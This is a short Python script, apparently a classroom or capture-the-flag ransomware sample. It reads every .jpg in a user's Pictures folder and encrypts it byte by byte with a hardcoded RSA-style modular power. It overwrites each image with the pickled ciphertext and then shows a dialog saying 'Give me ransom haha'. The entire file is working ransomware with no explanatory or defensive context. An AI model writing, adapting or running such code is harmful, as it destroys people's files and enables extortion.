import os, pickle, subprocess

n = 22291846172619859445381409012451
e = 65535
dir = '/home/csc2023/Pictures'

for filename in os.listdir(dir):
    if filename.endswith(".jpg"):
        path = os.path.join(dir, filename)
        plain_bytes = b''
        with open(path, 'rb') as f:
            plain_bytes = f.read()
        cipher_int = [pow(i, e, n) for i in plain_bytes]
        with open(path, 'wb') as f:
            pickle.dump(cipher_int, f)

subprocess.call("zenity --error --text=\"Give me ransom haha\" --title=\"Error\"", shell = True)
